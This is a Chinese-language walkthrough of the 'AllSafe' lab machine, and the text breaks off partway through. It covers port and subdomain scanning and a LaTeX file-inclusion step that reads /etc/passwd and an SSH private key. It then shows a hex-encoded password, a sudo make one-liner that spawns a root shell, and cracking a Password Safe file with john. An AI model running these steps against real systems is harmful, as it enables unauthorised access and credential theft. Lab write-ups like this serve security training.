{"pageProps":{"postData":{"id":"TheHackersLabsAllSafe","contentHtml":"<h1>AllSafe</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/139\">https://labs.thehackerslabs.com/machine/139</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">➜  AllSafe nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">38</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00036</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">2222</span>/tcp <span class=\"hljs-built_in\">open</span>  EtherNetIP-<span class=\"hljs-number\">1</span>\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">15</span>:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">18.73</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  AllSafe nmap -sT -A -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">2222</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span>       \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">40</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00056</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">9.2</span>p1 Debian <span class=\"hljs-number\">2</span>+deb12u3 (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> af:<span class=\"hljs-number\">79</span>:a1:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">80</span>:<span class=\"hljs-number\">45</span>:fb:b7:cb:<span class=\"hljs-number\">86</span>:fd:8b:<span class=\"hljs-number\">62</span>:<span class=\"hljs-number\">69</span>:4a:<span class=\"hljs-number\">64</span> (ECDSA)\n|_  <span class=\"hljs-number\">256</span> 6d:d4:9d:ac:0b:f0:a1:<span class=\"hljs-number\">88</span>:<span class=\"hljs-number\">66</span>:b4:ff:f6:<span class=\"hljs-number\">42</span>:bb:f2:e5 (ED25519)\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.65</span> ((Debian))\n|_http-title: Allsafe\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.65</span> (Debian)\n<span class=\"hljs-number\">2222</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">10.0</span>p2 Debian <span class=\"hljs-number\">7</span> (protocol <span class=\"hljs-number\">2.0</span>)\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">15</span>:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.19</span>, OpenWrt <span class=\"hljs-number\">21.02</span> (Linux <span class=\"hljs-number\">5.4</span>)\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.56</span> ms <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">22.48</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p>80 端口，域名是 <code>allsafe.thl</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image1.png\" alt=\"image.png\"></p>\n<p>目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image2.png\" alt=\"image.png\"></p>\n<p>主站中还有一个功能，可以提交网址，所以索性测试了 SSRF，但是没有触发，但是测试 <code>localhost</code> 的时候返回了 <code>1234565even</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image3.png\" alt=\"image.png\"></p>\n<p>后面没找到其他的东西</p>\n<p>尝试子域名爆破</p>\n<pre><code class=\"hljs language-python\">➜  AllSafe ffuf -u <span class=\"hljs-string\">'http://allsafe.thl/'</span> -H <span class=\"hljs-string\">'host:FUZZ.allsafe.thl'</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-<span class=\"hljs-number\">110000.</span>txt -fs <span class=\"hljs-number\">7016</span>\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://allsafe.thl/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.allsafe.thl\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 7016\n________________________________________________\n\nintranet                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 12ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 699 req/sec :: Duration: [0:01:57] :: Errors: 0 ::\n</span></code></pre>\n<p>得到子域名 <code>intranet</code> ，访问，登录需要员工 ID 格式为 <code>x-xxx-xxxx</code> ，密码估计就是上边的得到的 <code>123456Seven</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image4.png\" alt=\"image.png\"></p>\n<p>进行信息收集，目录爆破</p>\n<pre><code class=\"hljs language-python\">➜  AllSafe gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,<span class=\"hljs-built_in\">zip</span> -u http://intranet.allsafe.thl/                    \n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://intranet.allsafe.thl/\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,<span class=\"hljs-built_in\">zip</span>\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.php            (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> login.php]\n/images               (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">329</span>] [--> http://intranet.allsafe.thl/images/]\n/login.php            (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">2075</span>]\n/docs                 (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">327</span>] [--> http://intranet.allsafe.thl/docs/]\n/profile.php          (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">2305</span>]\n/assets               (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">329</span>] [--> http://intranet.allsafe.thl/assets/]\n/customers.php        (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">11072</span>]\n/db.php               (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">0</span>]\n/logout.php           (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> login.php]\n/process              (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">330</span>] [--> http://intranet.allsafe.thl/process/]\n/views                (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">328</span>] [--> http://intranet.allsafe.thl/views/]\n</code></pre>\n<p>看到有 <code>customers.php</code> ，进行查看，得到很多的员工信息，但是并没有员工 ID</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image5.png\" alt=\"image.png\"></p>\n<p>最后在主站的 “我们的团队” 中找到了类似员工 ID 的东西</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image6.png\" alt=\"image.png\"></p>\n<p><code>0-477-9990</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image7.png\" alt=\"image.png\"></p>\n<p>测试登录 <code>0-477-9990</code>:<code>123456Seven</code></p>\n<p>成功进入后台</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image8.png\" alt=\"image.png\"></p>\n<h2>后台利用</h2>\n<h3>信息收集</h3>\n<p>后台尝试寻找可利用的点</p>\n<p>点击 <code>Contrato</code> 可以查看合同</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image9.png\" alt=\"image.png\"></p>\n<p>当前在 <code>process</code> 目录中</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image10.png\" alt=\"image.png\"></p>\n<p>在其中的一个文档中还能翻到 <code>/etc/passwd</code> 的输出</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image11.png\" alt=\"image.png\"></p>\n<p>查看其 tex 文件，可以看到 <code>Empresa</code> 参数可以进行文件包含</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image12.png\" alt=\"image.png\"></p>\n<p>其中还有一个读取了 <code>SSH</code> 私钥的</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image13.png\" alt=\"image.png\"></p>\n<p>查看到读取的是 <code>/home/parker/.ssh/id_rsa</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image14.png\" alt=\"image.png\"></p>\n<h3>任意文件读取</h3>\n<p>将 <code>PDF</code> 上的 <code>id_rsa</code> 进行修复</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 假设文件是 key.txt</span>\ncat id_rsa | grep -v <span class=\"hljs-string\">\"PRIVATE KEY\"</span> | tr -d <span class=\"hljs-string\">' \\n'</span> | fold -w <span class=\"hljs-number\">70</span> > fixed_key_body.txt\n<span class=\"hljs-comment\"># 然后加上头尾</span>\necho <span class=\"hljs-string\">\"-----BEGIN OPENSSH PRIVATE KEY-----\"</span> > fixed_key.txt\ncat fixed_key_body.txt >> fixed_key.txt\necho <span class=\"hljs-string\">\"-----END OPENSSH PRIVATE KEY-----\"</span> >> fixed_key.txt\n</code></pre>\n<p>但是貌似不起效</p>\n<pre><code class=\"hljs language-python\">➜  AllSafe ssh parker@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span> -i fixed_key.txt -p <span class=\"hljs-number\">2222</span>\nparker@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span><span class=\"hljs-string\">'s password: \n</span></code></pre>\n<p>重新读取一下 <code>id_rsa</code>，和上边一样进行包含即可</p>\n<pre><code class=\"hljs language-python\">\\lstinputlisting{/home/parker/.ssh/id_rsa}\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image15.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image16.png\" alt=\"image.png\"></p>\n<p>再和上边一样修复一次后进行登录，成功登录</p>\n<pre><code class=\"hljs language-python\">➜  AllSafe ssh parker@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.130</span> -i fixed_key.txt -p <span class=\"hljs-number\">2222</span>\nparker@153504fd9bcb:~$ \n</code></pre>\n<h2>横向移动 - 容器逃逸</h2>\n<h3>to goddard</h3>\n<p>进来后我们是在容器里面</p>\n<pre><code class=\"hljs language-python\">parker@153504fd9bcb:~$ ls -al /\ntotal <span class=\"hljs-number\">68</span>\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Oct <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">41</span> .\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Oct <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">41</span> ..\n-rwxr-xr-x   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">0</span> Oct <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">41</span> .dockerenv\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">7</span> May <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">25</span> <span class=\"hljs-built_in\">bin</span> -> usr/<span class=\"hljs-built_in\">bin</span>\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> May <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">25</span> boot\ndrwxr-xr-x   <span class=\"hljs-number\">5</span> root root  <span class=\"hljs-number\">340</span> Oct <span class=\"hljs-number\">21</span> 04:<span class=\"hljs-number\">28</span> dev\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Oct <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">41</span> etc\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">24</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">39</span> home\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">7</span> May <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">25</span> lib -> usr/lib\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">9</span> May <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">25</span> lib64 -> usr/lib64\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> media\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> mnt\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> opt\ndr-xr-xr-x <span class=\"hljs-number\">149</span> root root    <span class=\"hljs-number\">0</span> Oct <span class=\"hljs-number\">21</span> 04:<span class=\"hljs-number\">28</span> proc\ndrwx------   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">24</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">39</span> root\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Oct <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">41</span> run\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">8</span> May <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">25</span> sbin -> usr/sbin\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> srv\ndr-xr-xr-x  <span class=\"hljs-number\">13</span> root root    <span class=\"hljs-number\">0</span> Oct <span class=\"hljs-number\">21</span> 04:<span class=\"hljs-number\">28</span> sys\ndrwxrwxrwt   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Oct <span class=\"hljs-number\">21</span> 06:<span class=\"hljs-number\">23</span> tmp\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> usr\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">31</span> var\n</code></pre>\n<p>数据库密码，但是连不上</p>\n<pre><code class=\"hljs language-python\">parker@153504fd9bcb:/var/www/intranet$ cat db.php \n&#x3C;?php\n\n$dsn = <span class=\"hljs-string\">\"mysql:host=db;dbname=allsafe;charset=utf8\"</span>;\n$username = <span class=\"hljs-string\">\"root\"</span>;\n$password = <span class=\"hljs-string\">\"31jB2rcbG1Pjorbd93eaxHW\"</span>;\n\n<span class=\"hljs-keyword\">try</span> {\n    $pdo = new PDO($dsn, $username,  $password);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n} catch (PDOExecption) {\n    die(<span class=\"hljs-string\">\"Connection failed: \"</span> . $e->getMessage());\n}\n</code></pre>\n<p><code>mail</code> 里面有东西</p>\n<pre><code class=\"hljs language-python\">parker@153504fd9bcb:/var/mail/parker$ cat meeting \nFrom goddard@localhost Thu Aug <span class=\"hljs-number\">21</span> <span class=\"hljs-number\">14</span>:05:<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">2025</span>\nDate: Thu, <span class=\"hljs-number\">21</span> Aug <span class=\"hljs-number\">2025</span> <span class=\"hljs-number\">14</span>:05:<span class=\"hljs-number\">20</span> +<span class=\"hljs-number\">0000</span>\nFrom: goddard@localhost\nTo: parker@localhost\nSubject: Reunión con E-Corp\nMIME-Version: <span class=\"hljs-number\">1.0</span>\nContent-<span class=\"hljs-type\">Type</span>: multipart/mixed; boundary=<span class=\"hljs-string\">\"BOUNDARY\"</span>\n\n--BOUNDARY\nContent-<span class=\"hljs-type\">Type</span>: text/plain; charset=UTF-<span class=\"hljs-number\">8</span>\nContent-Transfer-Encoding: 8bit\n\nHola Oliver,\n\nTe adjunto las notas que armé para la reunión con el cliente.  \nRevisalo y confirmame si llegamos con todo.\n\nSaludos,  \nGideon\n\n--BOUNDARY\nContent-<span class=\"hljs-type\">Type</span>: text/plain; name=<span class=\"hljs-string\">\"meeting_notes.txt\"</span>\nContent-Disposition: attachment; filename=<span class=\"hljs-string\">\"meeting_notes.txt\"</span>\nContent-Transfer-Encoding: 7bit\n\nMeeting Notes - E-Corp\n----------------------\n<span class=\"hljs-number\">1.</span> Confirmar agenda con el cliente.\n<span class=\"hljs-number\">2.</span> Revisar documentación técnica.\n<span class=\"hljs-number\">3.</span> Validar acceso al portal con la credencial:\n\n   Clave de acceso: 6D7033386E71556654416130494D314F70306157\n\n<span class=\"hljs-number\">4.</span> Preparar demo corta <span class=\"hljs-keyword\">del</span> servicio.\n--BOUNDARY--\nEOF.\n</code></pre>\n<p>其中告诉我们这是一个秘钥 <code>6D7033386E71556654416130494D314F70306157</code></p>\n<p>典型 16 进制编码，解出来是 <code>mp38nqUfTAa0IM1Op0aW</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image17.png\" alt=\"image.png\"></p>\n<p>该密码是用户 <code>goddard</code> 的密码</p>\n<pre><code class=\"hljs language-python\">parker@153504fd9bcb:/var/mail/parker$ su goddard\nPassword: \ngoddard@153504fd9bcb:/var/mail/parker$ \n</code></pre>\n<h3>to root</h3>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-python\">goddard@153504fd9bcb:/var/mail/parker$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> goddard on 153504fd9bcb:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>, use_pty\n\nUser goddard may run the following commands on 153504fd9bcb:\n    (ALL) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/make\n</code></pre>\n<p>直接提权到 <code>root</code></p>\n<pre><code class=\"hljs language-python\">goddard@153504fd9bcb:/var/mail/parker$ COMMAND=<span class=\"hljs-string\">'/bin/sh'</span>\nsudo make -s --<span class=\"hljs-built_in\">eval</span>=$<span class=\"hljs-string\">'x:\\n\\t-'</span><span class=\"hljs-string\">\"$COMMAND\"</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n</code></pre>\n<h3>to cisco</h3>\n<p>家目录下有一个 <code>psafe3</code> 文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># ls</span>\nsecrets.psafe3\n</code></pre>\n<p><code>PSAFE3</code> 文件大多属于 <code>Password Safe</code>。 <code>Password Safe</code> 可让您安全轻松地创建安全加密的用户名/密码列表。</p>\n<p>因为需要密码才能打开，我们通过 <code>john</code> 进行爆破</p>\n<pre><code class=\"hljs language-python\">➜  AllSafe pwsafe2john secrets.psafe3 > <span class=\"hljs-built_in\">hash</span>\n\n➜  AllSafe john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span> \nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">1</span> password <span class=\"hljs-built_in\">hash</span> (pwsafe, Password Safe [SHA256 <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 8x])\nCost <span class=\"hljs-number\">1</span> (iteration count) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">262144</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nrockandroll      (secret)     \n1g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">43</span> DONE (<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">51</span>) <span class=\"hljs-number\">0.02321</span>g/s <span class=\"hljs-number\">190.2</span>p/s <span class=\"hljs-number\">190.2</span>c/s <span class=\"hljs-number\">190.2</span>C/s <span class=\"hljs-number\">123456.</span>.whitetiger\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display <span class=\"hljs-built_in\">all</span> of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>得到密码 <code>rockandroll</code></p>\n<p>文件通过 <code>password safe</code> 打开</p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image18.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">sMpam!xxxxxxxxxxxxxxxxxx\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image19.png\" alt=\"image.png\"></p>\n<h2>提权</h2>\n<h3>信息收集</h3>\n<p>当前目录文件</p>\n<pre><code class=\"hljs language-python\">cisco@allsafe:~$ ls\ndarkarmy.<span class=\"hljs-built_in\">bin</span>  user.txt\n</code></pre>\n<p>家目录下能读取 user.txt</p>\n<pre><code class=\"hljs language-python\">cisco@allsafe:~$ cat user.txt \ne8xxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<p>darkarmy.bin</p>\n<pre><code class=\"hljs language-python\">cisco@allsafe:~$ strings darkarmy.<span class=\"hljs-built_in\">bin</span> \n70617373776f72643d64726b32303235210a\n</code></pre>\n<p>还是 HEX ，能得到一个密码 <code>drk2025!</code></p>\n<p><img src=\"/post-images/TheHackersLabsAllSafe/image20.png\" alt=\"image.png\"></p>\n<p>家目录下隐藏文件 <code>.unknow</code></p>\n<pre><code class=\"hljs language-python\">cisco@allsafe:~$ cat .unknown\nSi quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.\nA partir de ahora, todo contacto será únicamente a través <span class=\"hljs-keyword\">del</span> canal seguro.\n\nConéctate al servidor de mensajería y entra en la sala:\n    dark-ops\n\nNo intentes usar este acceso para nada más que lo acordado.\nNosotros decidimos cuándo y cómo se conversa.\n</code></pre>\n<blockquote>\n<p>如果您想联系我们，请不要使用常规渠道。\n从现在开始，所有联系都将仅通过安全渠道进行。</p>\n<p>连接到消息服务器并进入房间：\ndark-ops</p>\n<p>请勿尝试将此访问权限用于任何未经约定的用途。\n我们决定对话的时间和方式。</p>\n</blockquote>\n<p>查看正在监听端口，有两个开在本地的</p>\n<pre><code class=\"hljs language-python\">cisco@allsafe:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">0</span>                                              <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">68</span>                                             <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">4096</span>                                         <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">40089</span>                                          <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">4096</span>                                           <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">80</span>                                             <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">128</span>                                            <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">22</span>                                             <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*                                              \ntcp                    LISTEN                  <span class=\"hljs-number\">0</span>                       <span class=\"hljs-number\">4096</span>                                           <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">2222</span>                                           <span class=\"hljs-number\">0.0</span><span 